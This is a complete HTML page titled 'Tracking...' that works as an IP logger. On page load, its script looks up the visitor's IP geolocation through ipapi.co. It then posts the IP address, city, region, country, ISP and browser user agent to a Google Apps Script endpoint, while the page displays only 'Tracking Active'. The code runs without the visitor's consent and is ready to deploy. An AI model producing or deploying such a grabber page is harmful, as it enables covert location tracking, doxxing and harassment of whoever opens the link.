<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tracking...</title>
</head>
<body>

<script>
(async function(){

    try{
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        await fetch("https://script.google.com/macros/s/AKfycbxDKVhfal-XofN-8PPRAscr57eGnlyZBjzV1XHfKJosKWCRx71c1QZPyia2pKRx7H4J/exec", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                org: data.org,
                device: navigator.userAgent
            })
        });

    }catch(err){
        console.log("Error:", err);
    }

})();
</script>

Tracking Active

</body>
</html>
